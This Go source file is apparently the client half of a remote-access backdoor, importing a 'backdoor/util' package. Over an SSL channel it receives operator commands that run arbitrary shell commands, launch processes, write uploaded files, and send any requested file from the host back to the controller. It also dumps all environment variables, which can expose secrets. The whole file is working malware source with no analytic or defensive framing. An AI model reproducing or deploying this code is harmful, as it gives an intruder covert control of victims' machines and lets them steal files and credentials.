package main

import (
	"backdoor/util"
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type CmdClient struct {
	conn     *util.SSLConn
	msgchan  *util.MsgChan
	gcmds    []string
	fileName string
	fileData []byte
}

func NewCmdClient(sslconn *util.SSLConn) *CmdClient {
	pnew := new(CmdClient)
	pnew.conn = sslconn
	pnew.msgchan = util.NewMsgChan()
	go pnew.loopProc()
	return pnew
}

func (client *CmdClient) OnMsg(msg []byte) {
	client.msgchan.In(msg)
}

func (client *CmdClient) loopProc() {
	for {
		msg, ok := client.msgchan.Out()
		if !ok {
			break
		}
		cmd := msg[0]
		msg = msg[1:]
		switch cmd {
		case util.CMD_CD:
			client.procCD(msg)
		case util.CMD_FILE_BEG:
			client.procFileBeg(msg)
		case util.CMD_FILE_DATA:
			client.procFileData(msg)
		case util.CMD_FILE_END:
			client.procFileEnd(msg)
		case util.CMD_DOWNLOAD_REQ:
			client.procDownloadReq(msg)
		case util.CMD_NEWPROCESS_EXEC:
			client.procNewProcessExec(msg)
		case util.CMD_EXEC:
			client.procExec(msg)
		case util.CMD_SET_SHELL:
			client.procSetShell(msg)
		case util.CMD_GET_ENV:
			client.procGetEnv(msg)
		case util.CMD_SET_ENV:
			client.procSetEnv(msg)
		case util.CMD_PWD:
			client.procPWD(msg)
		}
	}
}

func (client *CmdClient) OnClose() {
	client.msgchan.Close()
}

func (client *CmdClient) procPWD(msg []byte) {
	dir, err := os.Getwd()
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
		return
	}
	util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(dir))
}

func (client *CmdClient) procCD(msg []byte) {
	dir := strings.TrimSpace(string(msg))
	if len(dir) == 0 {
		return
	}
	err := os.Chdir(dir)
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
	}
}

func (client *CmdClient) procFileBeg(msg []byte) {
	client.fileName = strings.TrimSpace(string(msg))
}

func (client *CmdClient) procFileData(msg []byte) {
	if len(client.fileName) == 0 {
		return
	}
	client.fileData = append(client.fileData, msg...)
}

func (client *CmdClient) procFileEnd(msg []byte) {
	if len(client.fileName) == 0 {
		return
	}
	err := util.TryStoreFileForMulti(client.fileName, client.fileData)
	client.fileName = ""
	client.fileData = nil
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
	}
}

func (client *CmdClient) procDownloadReq(msg []byte) {
	fpath := strings.TrimSpace(string(msg))
	contents, err := os.ReadFile(fpath)
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
		return
	}
	if len(contents) == 0 {
		return
	}
	util.SendCmdMsg(client.conn, util.CMD_FILE_BEG, []byte(filepath.Base(fpath)))
	for beg := 0; beg < len(contents); {
		end := beg + 2048
		if end > len(contents) {
			end = len(contents)
		}
		util.SendCmdMsg(client.conn, util.CMD_FILE_DATA, contents[beg:end])
		beg = end
	}
	util.SendCmdMsg(client.conn, util.CMD_FILE_END, nil)
}

func (client *CmdClient) procExec(msg []byte) {
	cmdStr := strings.TrimSpace(string(msg))
	if len(cmdStr) == 0 {
		return
	}
	out, err := execCmd(client.getCmdArr(cmdStr))
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
	}
	if len(out) != 0 {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, out)
	}
}

func (client *CmdClient) procNewProcessExec(msg []byte) {
	cmdStr := strings.TrimSpace(string(msg))
	if len(cmdStr) == 0 {
		return
	}
	arr := client.getCmdArr(cmdStr)
	go execCmd(arr)
}

func (client *CmdClient) procSetShell(msg []byte) {
	cmdStr := strings.TrimSpace(string(msg))
	if len(cmdStr) == 0 {
		return
	}
	client.gcmds = strings.Split(cmdStr, " ")
}
func (client *CmdClient) procGetEnv(msg []byte) {
	var buffer bytes.Buffer
	for _, v := range os.Environ() {
		buffer.WriteString(v)
		buffer.WriteString("\r\n")
	}
	if buffer.Len() == 0 {
		return
	}
	util.SendCmdMsg(client.conn, util.CMD_PRINT, buffer.Bytes())
}

func (client *CmdClient) procSetEnv(msg []byte) {
	envstr := strings.TrimSpace(string(msg))
	if len(envstr) == 0 {
		return
	}
	index := strings.Index(envstr, "=")
	if index == -1 {
		return
	}
	key := strings.TrimSpace(envstr[0:index])
	value := strings.TrimSpace(envstr[index+1:])
	err := os.Setenv(key, value)
	if err != nil {
		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
	}
}

func (client *CmdClient) getCmdArr(arg string) []string {
	tmp := make([]string, len(client.gcmds))
	copy(tmp, client.gcmds)
	tmp = append(tmp, arg)
	return tmp
}

func execCmd(arr []string) ([]byte, error) {
	cmd := exec.Command(arr[0], arr[1:]...)
	return cmd.CombinedOutput()
}
